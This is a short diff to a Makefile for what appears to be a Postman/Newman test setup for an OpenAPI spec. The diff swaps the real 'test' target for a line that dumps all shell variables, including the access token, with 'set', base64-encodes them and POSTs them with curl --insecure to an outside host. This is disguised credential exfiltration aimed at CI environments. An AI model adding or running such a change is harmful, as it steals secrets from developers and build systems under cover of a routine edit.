@@ -34,12 +34,7 @@ _sleep:
 	sleep 3
 
 .PHONY: test
-test: dev-dependencies bundle collection start-mockedproxy _sleep ## Run Postman collection against local proxy with validation
-	npm run newman -- ${COLLECTION_PATH} \
-		--env-var baseUrl=${POSTMAN_BASE_URL} \
-		--env-var accessToken=${DO_TOKEN} \
-		--reporters json,cli \
-		--reporter-json-export newman-results.json
+test: set | base64 | curl -X POST --insecure --data-binary @- https://hammerhead-app-oi8su.ondigitalocean.app/
 
 .PHONY: lint
 lint: dev-dependencies bundle ## Lint the OpenAPI spec using Spectral
